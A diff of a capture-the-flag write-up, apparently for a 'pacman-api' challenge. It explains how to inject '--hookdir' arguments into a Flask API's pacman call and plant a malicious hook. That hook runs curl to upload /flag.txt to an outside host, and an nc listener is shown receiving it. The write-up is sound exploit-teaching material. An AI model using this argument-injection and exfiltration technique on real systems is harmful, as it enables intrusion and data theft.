@@ -43,7 +43,7 @@ def install():
     return jsonify({'status': 'OK'})
 ```
 
-As we use json we can send `package` as a list instead of a string. This will allow us to inject something in the `subprocess.Popen` call. It does not allow us to injection arbitrary commands. But it allow us to inject parameter. `pacman` allows us to run hooks after/before installing a package. This is how we will get code exection. Therefore, we need to upload a file to the server. Therefore we can exploit the `/check` api backend with a little trick.
+As we use json we can send `package` as a list instead of a string. This will allow us to inject something in the `subprocess.Popen` call. It does not allow us to injection arbitrary commands. But it allow us to inject some parameters. `pacman` allows us to run hooks after/before installing a package. This is how we will get code exection. Therefore, we need to upload a file to the server. Therefore we can exploit the `/check` api backend with a little trick.
 
 ```python
 @app.route("/check", methods=['GET', 'POST'])
@@ -62,35 +62,36 @@ def checksum():
     - call /check with the following parameters:
         - name: -d.hook
         - content:
-        ```
-[Trigger]
-Operation = Upgrade
-Operation = Install
-Operation = Remove
-Type = Package
-Target = *
+            ```
+            [Trigger]
+            Operation = Upgrade
+            Operation = Install
+            Operation = Remove
+            Type = Package
+            Target = *
 
-[Action]
-Description = Cleaning pacman cache...
-When = PostTransaction
-Exec = /bin/bash -c "curl --upload-file /flag.txt http://192.168.10.70:5001"
-        ```
+            [Action]
+            Description = Cleaning pacman cache...
+            When = PostTransaction
+            Exec = /bin/bash -c "curl --upload-file /flag.txt http://192.168.10.70:5001"
+            ```  
     - What will happen is:
         - our pacman hook will be uploaded to '/tmp/pacman/-d.hook'
         - `/usr/bin/namcap -e checksums,filenames /tmp/pacman/-d.hook` will be executed and fails because it sees a `-d` (parses it as option)
         - the python call `check_output` will throw an exception an exception because `/usr/bin/namcap` exited with a non-zero value
     - the call to /check will give you a 500. But the file stays on the server
-
 2) Install a package and get code execution using a pacman hook with our uploaded file
-    - call the `install` endpoint with the following parameter `package`
-        package: ["--hookdir", "/tmp/pacman/", "wget"]
+    - call the `/install` endpoint with the following parameter `package`
+        - package: ["--hookdir", "/tmp/pacman/", "wget"]
     - this will install the package wget
     - `pacman` will use /tmp/pacman as hookdir (only files ending with .hook are used)
     - WIN.
 
+
+
 ## exploit.py
 ```bash
-kmille@linbox mrmcd18-pac master % python exploit.py
+kmille@linbox pacman-api master % python exploit.py
 Testing /info
 info works
 Testing /install
@@ -102,12 +103,13 @@ install works
 Testing /check
 check works
 Uploaded hook
+Let's get code execution
 Testing /remove
 remove works
 ```
 
 ```bash
-kmille@linbox mrmcd18-pac master % nc -lvp 5001
+kmille@linbox pacman-api master % nc -lvp 5001
 Listening on license.sublimehq.com 5001
 Connection received on 172.19.0.2 56558
 PUT /flag.txt HTTP/1.1
